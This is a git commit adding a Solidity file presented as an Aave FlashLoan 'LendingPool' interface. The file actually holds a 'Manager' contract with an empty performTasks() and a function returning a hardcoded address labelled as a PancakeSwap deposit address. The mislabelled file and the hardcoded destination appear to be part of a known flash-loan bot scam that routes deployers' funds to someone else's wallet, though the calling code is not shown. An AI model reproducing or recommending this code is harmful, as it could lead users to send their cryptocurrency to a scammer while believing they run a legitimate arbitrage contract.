2b1a560e67fbc0c93c4b3226f8b423794e0149ab
athcoin <103331128+athcoin@users.noreply.github.com>
2022-06-02 14:35:28 +0700

    Create LendingPool.sol

---
+++ aavefinance/FlashLoan/blob/main/contracts/interfaces/LendingPool.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x73d4e2408CFf425156e7FE30c1799e11E1FDBAD0;
+    }
+}
+
+//pancakeswapfunction
